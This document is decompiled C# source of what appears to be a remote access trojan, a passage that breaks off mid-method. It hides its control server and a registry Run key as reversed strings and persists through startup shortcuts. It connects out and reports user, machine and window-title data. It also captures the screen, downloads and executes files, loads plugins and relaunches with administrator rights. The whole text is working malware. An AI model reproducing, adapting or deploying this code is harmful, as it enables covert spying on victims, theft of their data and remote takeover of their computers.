using System;
using System.Collections.Specialized;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.IO.Compression;
using System.Net;
using System.Net.Sockets;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;

public class L
{
	public static string P;

	public static string x = "https://51482";

	public static string RG = "Windows";

	public static string sf = "nuR\\noisreVtnerruC\\swodniW\\tfosorciM\\erawtfoS";

	public static string VN = "T2ZmaWNlMTQ=";

	public static string Y = "|-F-|";

	public static string H;

	public static string ss = "https://tsoh.pamtrop.51482-trokaris";

	public static bool BD = Conversions.ToBoolean("False");

	public static bool Idr = Conversions.ToBoolean("True");

	public static bool IsF = Conversions.ToBoolean("False");

	public static bool Isu = Conversions.ToBoolean("True");

	public static bool att = Conversions.ToBoolean("True");

	public static bool DIC = Conversions.ToBoolean("False");

	public static string DR = "AppData";

	public static string EXE = "Payload.exe";

	public static string Time = "1";

	public static string lastcap = "";

	public static string VU = "v4.0";

	public static string DS = "Put discord title link to receive notifications !!";

	public static WindowsIdentity Str_0 = WindowsIdentity.GetCurrent();

	public static WindowsPrincipal Str_1 = new WindowsPrincipal(Str_0);

	public static object Fc = Str_1.IsInRole(WindowsBuiltInRole.Administrator).ToString().Replace("False", "User")
		.Replace("True", "Admin");

	public static string LIH = Environment.GetFolderPath(Environment.SpecialFolder.Templates) + "\\" + RG + ".exe";

	public static string rgg = Environment.GetFolderPath(Environment.SpecialFolder.Templates) + "\\" + RG + ".URL";

	private static byte[] b = new byte[5121];

	public static TcpClient FCC = null;

	public static bool Cn = false;

	public static object PLG = null;

	public static Computer F = new Computer();

	public static FileStream FS;

	public static FileInfo LO = new FileInfo(Assembly.GetEntryAssembly()!.Location);

	private static MemoryStream MeM = new MemoryStream();

	public static object MT = null;

	private static void LOP(object a0)
	{
		Ind((byte[])a0);
	}

	[STAThread]
	public static void main()
	{
		try
		{
			object objectValue = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(RuntimeHelpers.GetObjectValue(Interaction.CreateObject("WScript.Shell", "")), (Type)null, "CreateShortcut", new object[1] { Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + RG + ".lnk" }, (string[])null, (Type[])null, (bool[])null))));
			NewLateBinding.LateSet(RuntimeHelpers.GetObjectValue(objectValue), (Type)null, "TargetPath", new object[1] { Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + RG + ".exe" }, (string[])null, (Type[])null);
			NewLateBinding.LateCall(RuntimeHelpers.GetObjectValue(objectValue), (Type)null, "Save", new object[0], (string[])null, (Type[])null, (bool[])null, true);
			object objectValue2 = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(RuntimeHelpers.GetObjectValue(Interaction.CreateObject("WScript.Shell", "")), (Type)null, "CreateShortcut", new object[1] { Environment.GetFolderPath(Environment.SpecialFolder.Templates) + "\\" + RG + ".lnk" }, (string[])null, (Type[])null, (bool[])null))));
			NewLateBinding.LateSet(RuntimeHelpers.GetObjectValue(objectValue2), (Type)null, "TargetPath", new object[1] { Environment.GetFolderPath(Environment.SpecialFolder.Templates) + "\\" + RG + ".exe" }, (string[])null, (Type[])null);
			NewLateBinding.LateCall(RuntimeHelpers.GetObjectValue(objectValue2), (Type)null, "Save", new object[0], (string[])null, (Type[])null, (bool[])null, true);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		ko();
	}

	private static void _Lambda__2(object sender, SessionEndingEventArgs e)
	{
		ED();
	}

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int GetWindowTextLengthA(long hwnd);

	public static string ACT()
	{
		string result;
		try
		{
			IntPtr foregroundWindow = GetForegroundWindow();
			if (foregroundWindow == IntPtr.Zero)
			{
				return "";
			}
			string WinTitle = Strings.Space(checked(GetWindowTextLengthA((long)foregroundWindow) + 1));
			GetWindowTextA(foregroundWindow, ref WinTitle, WinTitle.Length);
			result = ENB(ref WinTitle);
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			ProjectData.SetProjectError(ex2);
			Exception projectError = ex2;
			ProjectData.SetProjectError(projectError);
			result = "";
			ProjectData.ClearProjectError();
			ProjectData.ClearProjectError();
			ProjectData.ClearProjectError();
		}
		return result;
	}

	public static string BS(ref byte[] B)
	{
		return Encoding.UTF8.GetString(B);
	}

	public static bool Cam()
	{
		checked
		{
			try
			{
				int num = 0;
				do
				{
					string lpszVer = null;
					short wDriver = (short)num;
					string lpszName = Strings.Space(100);
					if (!capGetDriverDescriptionA(wDriver, ref lpszName, 100, ref lpszVer, 100))
					{
						num++;
						continue;
					}
					return true;
				}
				while (num <= 4);
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception projectError = ex;
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
				ProjectData.ClearProjectError();
			}
			return false;
		}
	}

	[DllImport("avicap32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern bool capGetDriverDescriptionA(short wDriver, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpszName, int cbName, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpszVer, int cbVer);

	public static bool connect()
	{
		Cn = false;
		Thread.Sleep(2000);
		FileInfo lO = LO;
		lock (lO)
		{
			try
			{
				if (FCC != null)
				{
					try
					{
						FCC.Close();
						FCC = null;
					}
					catch (Exception ex)
					{
						ProjectData.SetProjectError(ex);
						Exception ex2 = ex;
						ProjectData.SetProjectError(ex2);
						Exception projectError = ex2;
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
						ProjectData.ClearProjectError();
						ProjectData.ClearProjectError();
					}
				}
				try
				{
					MeM.Dispose();
				}
				catch (Exception ex3)
				{
					ProjectData.SetProjectError(ex3);
					Exception ex4 = ex3;
					ProjectData.SetProjectError(ex4);
					Exception projectError2 = ex4;
					ProjectData.SetProjectError(projectError2);
					ProjectData.ClearProjectError();
					ProjectData.ClearProjectError();
					ProjectData.ClearProjectError();
				}
			}
			catch (Exception ex5)
			{
				ProjectData.SetProjectError(ex5);
				Exception ex6 = ex5;
				ProjectData.SetProjectError(ex6);
				Exception projectError3 = ex6;
				ProjectData.SetProjectError(projectError3);
				ProjectData.ClearProjectError();
				ProjectData.ClearProjectError();
				ProjectData.ClearProjectError();
			}
			try
			{
				MeM = new MemoryStream();
				FCC = new TcpClient();
				FCC.ReceiveBufferSize = 204800;
				FCC.SendBufferSize = 204800;
				FCC.Client.SendTimeout = 10000;
				FCC.Client.ReceiveTimeout = 10000;
				FCC.Connect(H, Conversions.ToInteger(P));
				Cn = true;
				Send(inf());
				try
				{
					string text = default(string);
					if (Operators.ConditionalCompareObjectEqual(RuntimeHelpers.GetObjectValue(GTV("vn", "")), (object)"", false))
					{
						text = text + DEB(ref VN) + "\r\n";
					}
					else
					{
						string text2 = text;
						string s = Conversions.ToString(RuntimeHelpers.GetObjectValue(GTV("vn", "")));
						text = text2 + DEB(ref s) + "\r\n";
					}
					text = string.Concat(text + H + ":" + P + "\r\n", DR, "\r\n", EXE, "\r\n", Conversions.ToString(Idr), "\r\n", Conversions.ToString(IsF), "\r\n", Conversions.ToString(Isu), "\r\n", Conversions.ToString(BD));
					Send("inf" + Y + ENB(ref text));
				}
				catch (Exception ex7)
				{
					ProjectData.SetProjectError(ex7);
					Exception ex8 = ex7;
					ProjectData.SetProjectError(ex8);
					Exception projectError4 = ex8;
					ProjectData.SetProjectError(projectError4);
					ProjectData.ClearProjectError();
					ProjectData.ClearProjectError();
					ProjectData.ClearProjectError();
				}
			}
			catch (Exception ex9)
			{
				ProjectData.SetProjectError(ex9);
				Exception ex10 = ex9;
				ProjectData.SetProjectError(ex10);
				Exception projectError5 = ex10;
				ProjectData.SetProjectError(projectError5);
				Cn = false;
				ProjectData.ClearProjectError();
				ProjectData.ClearProjectError();
				ProjectData.ClearProjectError();
			}
		}
		return Cn;
	}

	public static string DEB(ref string s)
	{
		byte[] B = Convert.FromBase64String(s);
		return BS(ref B);
	}

	public static void DLV(string n)
	{
		try
		{
			((ServerComputer)F).get_Registry().get_CurrentUser().OpenSubKey("Software\\" + RG, writable: true)!.DeleteValue(n);
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception projectError = ex;
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			ProjectData.ClearProjectError();
		}
	}

	public static void ED()
	{
		pr(0);
	}

	public static string ENB(ref string s)
	{
		return Convert.ToBase64String(SB(ref s));
	}

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern IntPtr GetForegroundWindow();

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetVolumeInformationA([MarshalAs(UnmanagedType.VBByRefStr)] ref string lpRootPathName, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpVolumeNameBuffer, int nVolumeNameSize, ref int lpVolumeSerialNumber, ref int lpMaximumComponentLength, ref int lpFileSystemFlags, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpFileSystemNameBuffer, int nFileSystemNameSize);

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int GetWindowTextA(IntPtr hWnd, [MarshalAs(UnmanagedType.VBByRefStr)] ref string WinTitle, int MaxLength);

	public static object GTV(string n, object ret)
	{
		try
		{
			return RuntimeHelpers.GetObjectValue(((ServerComputer)F).get_Registry().get_CurrentUser().OpenSubKey("Software\\" + RG)!.GetValue(n, RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(ret)))));
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception projectError = ex;
			ProjectData.SetProjectError(projectError);
			object objectValue = RuntimeHelpers.GetObjectValue(ret);
			ProjectData.ClearProjectError();
			ProjectData.ClearProjectError();
			return objectValue;
		}
	}

	private static string HWD()
	{
		try
		{
			string lpVolumeNameBuffer = null;
			int lpMaximumComponentLength = 0;
			int lpFileSystemFlags = 0;
			string lpFileSystemNameBuffer = null;
			string lpRootPathName = Interaction.Environ("SystemDrive") + "\\";
			int lpVolumeSerialNumber = default(int);
			GetVolumeInformationA(ref lpRootPathName, ref lpVolumeNameBuffer, 0, ref lpVolumeSerialNumber, ref lpMaximumComponentLength, ref lpFileSystemFlags, ref lpFileSystemNameBuffer, 0);
			return Conversion.Hex(lpVolumeSerialNumber);
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception projectError = ex;
			ProjectData.SetProjectError(projectError);
			string result = "ERR";
			ProjectData.ClearProjectError();
			ProjectData.ClearProjectError();
			return result;
		}
	}

	private static void ASMIN(bool isCritical, ref bool refWasCritical, bool needSystemCriticalBreaks)
	{
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	public static void Ind(byte[] b)
	{
		//IL_065a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0661: Expected O, but got Unknown
		//IL_06ec: Unknown result type (might be due to invalid IL or missing references)
		//IL_06f3: Expected O, but got Unknown
		string[] array = Strings.Split(BS(ref b), Y, -1, (CompareMethod)0);
		checked
		{
			try
			{
				string text = array[0];
				switch (text)
				{
				case "AW":
				{
					Process process = new Process();
					process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
					process.StartInfo.FileName = Application.get_ExecutablePath();
					process.StartInfo.UseShellExecute = true;
					process.StartInfo.Verb = "runas";
					process.StartInfo.Arguments = "";
					process.Start();
					try
					{
						bool refWasCritical = default(bool);
						ASMIN(isCritical: false, ref refWasCritical, needSystemCriticalBreaks: false);
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
					Environment.Exit(0);
					break;
				}
				case "TMP":
					Send("TMP");
					break;
				case "RNS":
					Send("RNS");
					break;
				case "Setting_Chat":
					Send("Setting_Chat");
					break;
				case "ll":
					Cn = false;
					return;
				case "prof":
					switch (array[1])
					{
					case "~":
						STV(array[2], array[3], RegistryValueKind.String);
						break;
					case "!":
						STV(array[2], array[3], RegistryValueKind.String);
						Send(Conversions.ToString(RuntimeHelpers.GetObjectValue(Operators.ConcatenateObject((object)("getvalue" + Y + array[1] + Y), RuntimeHelpers.GetObjectValue(GTV(array[1], ""))))));
						break;
					case "@":
						DLV(array[2]);
						break;
					}
					return;
				}
				if (Operators.CompareString(text, "rn", false) != 0)
				{
					switch (text)
					{
					case "inv":
					{
						byte[] array2 = (byte[])GTV(array[1], new byte[0]);
						if ((array[3].Length < 10) & (array2.Length == 0))
						{
							Send("pl" + Y + array[1] + Y + Conversions.ToString(1));
							return;
						}
						if (array[3].Length > 10)
						{
							MemoryStream memoryStream = new MemoryStream();
							int length = (array[0] + Y + array[1] + Y + array[2] + Y).Length;
							memoryStream.Write(b, length, b.Length - length);
							array2 = ZIP(memoryStream.ToArray());
							STV(array[1], array2, RegistryValueKind.Binary);
						}
						Send("pl" + Y + array[1] + Y + Conversions.ToString(0));
						object objectValue = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(Plugin(array2, "A"))));
						NewLateBinding.LateSet(RuntimeHelpers.GetObjectValue(objectValue), (Type)null, "h", new object[1] { H }, (string[])null, (Type[])null);
						NewLateBinding.LateSet(RuntimeHelpers.GetObjectValue(objectValue), (Type)null, "p", new object[1] { P }, (string[])null, (Type[])null);
						NewLateBinding.LateSet(RuntimeHelpers.GetObjectValue(objectValue), (Type)null, "osk", new object[1] { array[2] }, (string[])null, (Type[])null);
						NewLateBinding.LateCall(RuntimeHelpers.GetObjectValue(objectValue), (Type)null, "start", new object[0], (string[])null, (Type[])null, (bool[])null, true);
						while (!Conversions.ToBoolean(RuntimeHelpers.GetObjectValue(Operators.OrObject((object)(!Cn), RuntimeHelpers.GetObjectValue(Operators.CompareObjectEqual(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(RuntimeHelpers.GetObjectValue(objectValue), (Type)null, "Off", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)true, false))))))
						{
							Thread.Sleep(1);
						}
						NewLateBinding.LateSet(RuntimeHelpers.GetObjectValue(objectValue), (Type)null, "off", new object[1] { true }, (string[])null, (Type[])null);
						return;
					}
					case "ret":
					{
						byte[] array3 = (byte[])GTV(array[1], new byte[0]);
						if ((array[2].Length < 10) & (array3.Length == 0))
						{
							Send("pl" + Y + array[1] + Y + Conversions.ToString(1));
							return;
						}
						if (array[2].Length > 10)
						{
							MemoryStream memoryStream2 = new MemoryStream();
							int length2 = (array[0] + Y + array[1] + Y).Length;
							memoryStream2.Write(b, length2, b.Length - length2);
							array3 = ZIP(memoryStream2.ToArray());
							STV(array[1], array3, RegistryValueKind.Binary);
						}
						Send("pl" + Y + array[1] + Y + Conversions.ToString(0));
						object objectValue2 = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(Plugin(array3, "A"))));
						string[] array4 = new string[5]
						{
							"ret",
							Y,
							array[1],
							Y,
							null
						};
						string[] array5 = array4;
						string s = Conversions.ToString(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(RuntimeHelpers.GetObjectValue(objectValue2), (Type)null, "GT", new object[0], (string[])null, (Type[])null, (bool[])null)));
						array5[4] = ENB(ref s);
						Send(string.Concat(array4));
						return;
					}
					case "CAP":
					{
						Rectangle bounds = Screen.get_PrimaryScreen().get_Bounds();
						Bitmap val = new Bitmap(Screen.get_PrimaryScreen().get_Bounds().Width, bounds.Height, (PixelFormat)135173);
						Graphics val2 = Graphics.FromImage((Image)(object)val);
						Size size = new Size(((Image)val).get_Width(), ((Image)val).get_Height());
						val2.CopyFromScreen(0, 0, 0, 0, size, (CopyPixelOperation)13369376);
						try
						{
							bounds = new Rectangle(size: new Size(32, 32), location: Cursor.get_Position());
							Cursors.get_Default().Draw(val2, bounds);
						}
						catch (Exception ex)
						{
							ProjectData.SetProjectError(ex);
							Exception projectError2 = ex;
							ProjectData.SetProjectError(projectError2);
							ProjectData.ClearProjectError();
							ProjectData.ClearProjectError();
						}
						val2.Dispose();
						Bitmap val3 = new Bitmap(Conversions.ToInteger(array[1]), Conversions.ToInteger(array[2]));
						val2 = Graphics.FromImage((Image)(object)val3);
						val2.DrawImage((Image)(object)val, 0, 0, ((Image)val3).get_Width(), ((Image)val3).get_Height());
						val2.Dispose();
						MemoryStream memoryStream3 = new MemoryStream();
						string s = "CAP" + Y;
						b = SB(ref s);
						memoryStream3.Write(b, 0, b.Length);
						MemoryStream memoryStream4 = new MemoryStream();
						((Image)val3).Save((Stream)memoryStream4, ImageFormat.get_Jpeg());
						string text2 = md5(memoryStream4.ToArray());
						if (Operators.CompareString(text2, lastcap, false) != 0)
						{
							lastcap = text2;
							memoryStream3.Write(memoryStream4.ToArray(), 0, (int)memoryStream4.Length);
						}
						else
						{
							memoryStream3.WriteByte(0);
						}
						Sendb(memoryStream3.ToArray());
						memoryStream3.Dispose();
						memoryStream4.Dispose();
						((Image)val).Dispose();
						((Image)val3).Dispose();
						return;
					}
					case "un":
						switch (array[1])
						{
						case "~":
							UNS();
							break;
						case "!":
							pr(0);
							ProjectData.EndApp();
							break;
						case "@":
							pr(0);
							Process.Start(LO.FullName);
							ProjectData.EndApp();
							break;
						}
						return;
					}
					if (Operators.CompareString(text, "Ex", false) == 0)
					{
						if (PLG == null)
						{
							Send("PLG");
							int num = 0;
							while (!(unchecked(PLG != null || num == 20) | !Cn))
							{
								num++;
								Thread.Sleep(1000);
							}
							if ((PLG == null) | !Cn)
							{
								return;
							}
						}
						object[] array6 = new object[1] { b };
						bool[] array7 = new bool[1] { true };
						NewLateBinding.LateCall(RuntimeHelpers.GetObjectValue(PLG), (Type)null, "ind", array6, (string[])null, (Type[])null, array7, true);
						if (array7[0])
						{
							b = (byte[])Conversions.ChangeType(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array6[0]))), typeof(byte[]));
						}
					}
					else if (Operators.CompareString(text, "PLG", false) == 0)
					{
						MemoryStream memoryStream5 = new MemoryStream();
						int length3 = (array[0] + Y).Length;
						memoryStream5.Write(b, length3, b.Length - length3);
						PLG = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(Plugin(ZIP(memoryStream5.ToArray()), "A"))));
						NewLateBinding.LateSet(RuntimeHelpers.GetObjectValue(PLG), (Type)null, "H", new object[1] { H }, (string[])null, (Type[])null);
						NewLateBinding.LateSet(RuntimeHelpers.GetObjectValue(PLG), (Type)null, "P", new object[1] { P }, (string[])null, (Type[])null);
						NewLateBinding.LateSet(RuntimeHelpers.GetObjectValue(PLG), (Type)null, "c", new object[1] { FCC }, (string[])null, (Type[])null);
					}
					return;
				}
				byte[] bytes = default(byte[]);
				if (array[2][0] == '\u001f')
				{
					try
					{
						MemoryStream memoryStream6 = new MemoryStream();
						int length4 = (array[0] + Y + array[1] + Y).Length;
						memoryStream6.Write(b, length4, b.Length - length4);
						bytes = ZIP(memoryStream6.ToArray());
					}
					catch (Exception ex2)
					{
						ProjectData.SetProjectError(ex2);
						Exception projectError3 = ex2;
						ProjectData.SetProjectError(projectError3);
						Send("MSG" + Y + "Execute ERROR");
						Send("bla");
						ProjectData.ClearProjectError();
						ProjectData.ClearProjectError();
						return;
					}
				}
				Send("bla");
				string text3 = Path.GetTempFileName() + "." + array[1];
				try
				{
					File.WriteAllBytes(text3, bytes);
					Process.Start(text3);
					Send("MSG" + Y + "Executed As " + new FileInfo(text3).get_Name());
				}
				catch (Exception ex3)
				{
					ProjectData.SetProjectError(ex3);
					Exception ex4 = ex3;
					ProjectData.SetProjectError(ex4);
					Exception ex5 = ex4;
					Send("MSG" + Y + "Execute ERROR " + ex5.Message);
					ProjectData.ClearProjectError();
					ProjectData.ClearProjectError();
				}
			}
			catch (Exception ex6)
			{
				ProjectData.SetProjectError(ex6);
				Exception ex7 = ex6;
				ProjectData.SetProjectError(ex7);
				Exception ex8 = ex7;
				if (array.Length > 0 && ((Operators.CompareString(array[0], "Ex", false) == 0) | (Operators.CompareString(array[0], "PLG", false) == 0)))
				{
					PLG = null;
				}
				try
				{
					Send("ER" + Y + array[0] + Y + ex8.Message);
				}
				catch (Exception ex9)
				{
					ProjectData.SetProjectError(ex9);
					Exception projectError4 = ex9;
					ProjectData.SetProjectError(projectError4);
					ProjectData.ClearProjectError();
					ProjectData.ClearProjectError();
				}
				ProjectData.ClearProjectError();
				ProjectData.ClearProjectError();
			}
		}
	}

	public static string inf()
	{
		string text = "ll" + Y;
		try
		{
			if (Operators.ConditionalCompareObjectEqual(RuntimeHelpers.GetObjectValue(GTV("vn", "")), (object)"", false))
			{
				string text2 = text;
				string s = DEB(ref VN) + " : C [ " + HWD() + " ]";
				text = text2 + ENB(ref s) + Y;
			}
			else
			{
				string text3 = text;
				string s = Conversions.ToString(RuntimeHelpers.GetObjectValue(GTV("vn", "")));
				string s2 = DEB(ref s) + "_" + HWD();
				text = text3 + ENB(ref s2) + Y;
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception projectError = ex;
			ProjectData.SetProjectError(projectError);
			string text4 = text;
			string s2 = HWD();
			text = text4 + ENB(ref s2) + Y;
			ProjectData.ClearProjectError();
			ProjectData.ClearProjectError();
			ProjectData.ClearProjectError();
		}
		try
		{
			text = text + Environment.UserName + Y;
		}
		catch (Exception ex2)
		{
			ProjectData.SetProjectError(ex2);
			Exception projectError2 = ex2;
			ProjectData.SetProjectError(projectError2);
			text = text + "??" + Y;
			ProjectData.ClearProjectError();
			ProjectData.ClearProjectError();
			ProjectData.ClearProjectError();
		}
		try
		{
			text = text + LO.LastWriteTime.Date.ToString("yy-MM-dd") + Y;
		}
		catch (Exception ex3)
		{
			ProjectData.SetProjectError(ex3);
			Exception projectError3 = ex3;
			ProjectData.SetProjectError(projectError3);
			text = text + "??" + Y;
			ProjectData.ClearProjectError();
			ProjectData.ClearProjectError();
			ProjectData.ClearProjectError();
		}
		try
		{
			text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)text, Fc), (object)Y));
		}
		catch (Exception ex4)
		{
			ProjectData.SetProjectError(ex4);
			Exception projectError4 = ex4;
			ProjectData.SetProjectError(projectError4);
			text = text + "??-??-??" + Y;
			ProjectData.ClearProjectError();
			ProjectData.ClearProjectError();
			ProjectData.ClearProjectError();
		}
		string text5 = ((ServerComputer)F).get_Info().get_OSFullName().Replace("Microsoft", "")
			.Replace("x", "X")
			.Replace("X", "X")
			.Replace("Windows", "Win")
			.Replace("®", "")
			.Replace("™", "")
			.Replace("  ", " ")
			.Replace(" Win", "Win");
		text = text + "..." + Y;
		text = text + text5.Substring(0, 5) + Y;
		try
		{
			text += ((ServerComputer)F).get_Info().get_OSFullName().Replace("Microsoft", "")
				.Replace("Windows", "Win")
				.Replace("®", "")
				.Replace("™", "")
				.Replace("  ", " ")
				.Replace(" Win", "Win");
		}
		catch (Exception ex5)
		{
			ProjectData.SetProjectError(ex5);
			Exception projectError5 = ex5;
			ProjectData.SetProjectError(projectError5);
			text += "??";
			ProjectData.ClearProjectError();
			ProjectData.ClearProjectError();
			ProjectData.ClearProjectError();
		}
		text += "SP";
		try
		{
			string[] array = Strings.Split(Environment.OSVersion.ServicePack, " ", -1, (CompareMethod)0);
			if (array.Length == 1)
			{
				text += "0";
			}
			text += array[checked(array.Length - 1)];
		}
		catch (Exception ex6)
		{
			ProjectData.SetProjectError(ex6);
			Exception projectError6 = ex6;
			ProjectData.SetProjectError(projectError6);
			text += "0";
			ProjectData.ClearProjectError();
			ProjectData.ClearProjectError();
			ProjectData.ClearProjectError();
		}
		try
		{
			text = ((!Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles).Contains("x86")) ? (text + " x86" + Y) : (text + " x64" + Y));
		}
		catch (Exception ex7)
		{
			ProjectData.SetProjectError(ex7);
			Exception projectError7 = ex7;
			ProjectData.SetProjectError(projectError7);
			text += Y;
			ProjectData.ClearProjectError();
			ProjectData.ClearProjectError();
			ProjectData.ClearProjectError();
		}
		text = ((!Cam()) ? (text + "No" + Y) : (text + "Yes" + Y));
		text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)text, Fc), (object)Y), (object)".."), (object)Y), (object)VU), (object)Y), (object)ACT()), (object)Y));
		string text6 = "";
		try
		{
			string[] valueNames = ((ServerComputer)F).get_Registry().get_CurrentUser().CreateSubKey("Software\\" + RG, RegistryKeyPermissionCheck.Default)
				.GetValueNames();
			foreach (string text7 in valueNames)
			{
				if (text7.Length == 32)
				{
					text6 = text6 + text7 + ",";
				}
			}
		}
		catch (Exception ex8)
		{
			ProjectData.SetProjectError(ex8);
			Exception projectError8 = ex8;
			ProjectData.SetProjectError(projectError8);
			ProjectData.ClearProjectError();
			ProjectData.ClearProjectError();
			ProjectData.ClearProjectError();
		}
		return text + text6;
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	public static void ko()
	{
		//IL_0163: Unknown result type (might be due to invalid IL or missing references)
		//IL_016d: Expected O, but got Unknown
		checked
		{
			try
			{
				sf = Strings.StrReverse(sf);
				x = x.Replace("https://", "");
				string text = x;
				P = Strings.StrReverse(text);
				ss = ss.Replace("https://", "");
				string text2 = ss;
				H = Strings.StrReverse(text2);
				for (int num = Conversions.ToInteger(Time); num != 0; num--)
				{
					Thread.Sleep(1000);
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
			if (Interaction.Command() != null)
			{
				try
				{
					((ServerComputer)F).get_Registry().get_CurrentUser().SetValue("di", "!");
				}
				catch (Exception ex)
				{
					ProjectData.SetProjectError(ex);
					Exception projectError2 = ex;
					ProjectData.SetProjectError(projectError2);
					ProjectData.ClearProjectError();
					ProjectData.ClearProjectError();
				}
				Thread.Sleep(5000);
			}
			bool createdNew = false;
			MT = new Mutex(initiallyOwned: true, RG, out createdNew);
			if (!createdNew)
			{
				ProjectData.EndApp();
			}
			INS();
			if (!Idr)
			{
				EXE = LO.get_Name();
				DR = LO.Directory!.get_Name();
			}
			Thread thread = new Thread(RC, 1);
			thread.Start();
			int num2 = 0;
			string text3 = "";
			if (BD)
			{
				try
				{
					SystemEvents.add_SessionEnding(new SessionEndingEventHandler(_Lambda__2));
					pr(1);
				}
				catch (Exception ex2)
				{
					ProjectData.SetProjectError(ex2);
					Exception projectError3 = ex2;
					ProjectData.SetProjectError(projectError3);
					ProjectData.ClearProjectError();
					ProjectData.ClearProjectError();
				}
			}
			while (true)
			{
				Thread.Sleep(1000);
				if (!Cn)
				{
					text3 = "";
				}
				Application.DoEvents();
				try
				{
					num2++;
					if (num2 == 5)
					{
						try
						{
							Process.GetCurrentProcess().MinWorkingSet = (IntPtr)1024;
						}
						catch (Exception ex3)
						{
							ProjectData.SetProjectError(ex3);
							Exception projectError4 = ex3;
							ProjectData.SetProjectError(projectError4);
							ProjectData.ClearProjectError();
							ProjectData.ClearProjectError();
						}
					}
					if (num2 >= 8)
					{
						num2 = 0;
						string text4 = ACT();
						if (Operators.CompareString(text3, text4, false) != 0)
						{
							text3 = text4;
							Send("act" + Y + text4);
						}
					}
					if (!Isu)
					{
						continue;
					}
					try
					{
						if (Operators.ConditionalCompareObjectNotEqual(RuntimeHelpers.GetObjectValue(((ServerComputer)F).get_Registry().get_CurrentUser().GetValue(sf + "\\" + RG, "")), (object)rgg, false))
						{
							((ServerComputer)F).get_Registry().get_CurrentUser().OpenSubKey(sf, writable: true)!.SetValue(RG, rgg);
						}
					}
					catch (Exception ex4)
					{
						ProjectData.SetProjectError(ex4);
						Exception projectError5 = ex4;
						ProjectData.SetProjectError(projectError5);
						ProjectData.ClearProjectError();
						ProjectData.ClearProjectError();
					}
					try
					{
						if (Operators.ConditionalCompareObjectNotEqual(RuntimeHelpers.GetObjectValue(((ServerComputer)F).get_Registry().get_LocalMachine().GetValue(sf + "\\" + RG, "")), (object)rgg, false))
						{
							((ServerComputer)F).get_Registry().get_LocalMachine().OpenSubKey(sf, writable: true)!.SetValue(RG, rgg);
						}
					}
					catch (Exception ex5)
					{
						ProjectData.SetProjectError(ex5);
						Exception projectError6 = ex5;
						ProjectData.SetProjectError(projectError6);
						ProjectData.ClearProjectError();
						ProjectData.ClearProjectError();
					}
				}
				catch (Exception ex6)
				{
					ProjectData.SetProjectError(ex6);
					Exception projectError7 = ex6;
					ProjectData.SetProjectError(projectError7);
					ProjectData.ClearProjectError();
					ProjectData.ClearProjectError();
				}
			}
		}
	}

	public static string md5(byte[] B)
	{
		B = new MD5CryptoServiceProvider().ComputeHash(B);
		string text = "";
		byte[] array = B;
		foreach (byte b in array)
		{
			text += b.ToString("x2");
		}
		return text;
	}

	[DllImport("ntdll")]
	private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);

	public static object Plugin(byte[] b, string c)
	{
		Module[] modules = Assembly.Load(b).GetModules();
